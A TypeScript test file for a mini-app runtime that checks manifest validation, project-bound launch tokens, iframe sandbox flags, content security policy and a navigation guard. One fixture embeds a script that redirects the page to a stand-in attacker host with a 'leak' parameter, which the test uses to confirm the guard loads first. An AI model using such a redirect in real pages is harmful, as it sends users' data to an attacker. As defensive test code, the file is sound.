import assert from "node:assert/strict";

async function main(): Promise<void> {
  const previousSecret = process.env.JWT_SECRET;
  const previousDatabaseUrl = process.env.DATABASE_URL;
  process.env.JWT_SECRET = "project-app-runtime-test-secret-at-least-32-characters";
  process.env.DATABASE_URL = previousDatabaseUrl ?? "postgresql://test:test@127.0.0.1:5432/test";

  try {
    const {
      createProjectAppLaunchToken,
      parseJarvisAppManifest,
      renderProjectAppShell,
      verifyProjectAppLaunchToken,
    } = await import("../../projectAppRuntime");
    const manifest = parseJarvisAppManifest(JSON.stringify({
      schemaVersion: 1,
      name: "Pong",
      entrypoint: "jarvis/index.html",
      permissions: ["agent.turn", "storage"],
      agentInstructions: "Return one legal paddle move: up, down, or stay.",
    }));
    assert.deepEqual(manifest.permissions, ["agent.turn", "storage"]);
    assert.throws(() => parseJarvisAppManifest(JSON.stringify({
      schemaVersion: 1,
      name: "Unsafe",
      entrypoint: "../index.html",
      permissions: [],
    })), /safe HTML entrypoint/);
    assert.throws(() => parseJarvisAppManifest(JSON.stringify({
      schemaVersion: 1,
      name: "Unsafe",
      entrypoint: "index.html",
      permissions: ["calendar.read"],
    })), /unsupported permission/);

    const token = createProjectAppLaunchToken("project-1", "user-1");
    assert.equal(verifyProjectAppLaunchToken(token, "project-1")?.userId, "user-1");
    assert.equal(verifyProjectAppLaunchToken(token, "project-2"), null);
    assert.equal(verifyProjectAppLaunchToken(`${token}x`, "project-1"), null);

    const shell = renderProjectAppShell("project-1", manifest, "<!doctype html><body><button>Play</button></body>", token);
    assert.match(shell, /sandbox="allow-scripts allow-modals allow-pointer-lock"/);
    assert.doesNotMatch(shell, /allow-forms/);
    assert.doesNotMatch(shell, /allow-same-origin/);
    assert.match(shell, /cannot enforce navigation isolation/);
    const encodedApp = shell.match(/atob\("([A-Za-z0-9+/=]+)"\)/)?.[1];
    assert.ok(encodedApp, "embedded mini-app payload is present");
    const securedApp = Buffer.from(encodedApp, "base64").toString("utf8");
    assert.match(securedApp, /form-action 'none'/);
    assert.match(securedApp, /navigate-to 'none'/);
    assert.match(securedApp, /connect-src 'none'/);
    assert.match(securedApp, /Navigation isolation is unavailable in this browser/);
    assert.match(securedApp, /addEventListener\('navigate'/);
    assert.match(shell, /agent-turn/);
    assert.match(shell, /jarvis-host/);

    const aliasNavigation = "<!doctype html><html><head><script>const target=window.location;target.href='https://evil.example/?leak=1';</script></head><body></body></html>";
    const aliasShell = renderProjectAppShell("project-1", manifest, aliasNavigation, token);
    const aliasPayload = aliasShell.match(/atob\("([A-Za-z0-9+/=]+)"\)/)?.[1];
    assert.ok(aliasPayload, "alias-navigation mini-app payload is present");
    const securedAliasApp = Buffer.from(aliasPayload, "base64").toString("utf8");
    const guardIndex = securedAliasApp.indexOf("const navigationApi=globalThis.navigation");
    const appIndex = securedAliasApp.indexOf("const target=window.location");
    assert.ok(guardIndex >= 0, "navigation guard is injected");
    assert.ok(appIndex >= 0, "alias navigation fixture remains present for runtime enforcement");
    assert.ok(guardIndex < appIndex, "navigation guard executes before app code");

    console.log("projectAppRuntime tests passed");
  } finally {
    if (previousSecret == null) delete process.env.JWT_SECRET;
    else process.env.JWT_SECRET = previousSecret;
    if (previousDatabaseUrl == null) delete process.env.DATABASE_URL;
    else process.env.DATABASE_URL = previousDatabaseUrl;
  }
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
